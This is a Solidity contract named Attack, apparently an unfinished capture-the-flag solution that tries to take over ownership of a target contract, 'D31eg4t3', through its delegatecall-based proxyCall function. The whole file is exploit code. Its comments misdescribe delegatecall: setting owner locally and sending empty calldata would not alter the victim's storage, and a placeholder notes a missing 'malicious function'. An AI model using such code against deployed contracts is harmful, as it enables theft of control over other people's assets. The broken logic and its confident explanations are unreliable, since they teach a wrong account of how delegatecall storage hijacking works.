// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;

    uint256 internal var0; // Placeholder for var0
    uint8 internal var1; // Placeholder for var1
    string internal var2; // Placeholder for var2
    address internal var3; // Placeholder for var3
    uint8 internal var4; // Placeholder for var4
    address public owner;



    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here


    function exploit() external {
        // Set the owner to the attacker's address through delegate call magic
        owner = msg.sender;

        // Craft the data for the delegatecall
        // This time we don't really need to call any function, the setting of owner above should suffice due to delegatecall's context sharing
        bytes memory data = "";

        // Cast the victim address to the interface and make the proxy call
        // This should inadvertently change the owner in the D31eg4t3 contract
        ID31eg4t3(victim).proxyCall(data);
    }
}
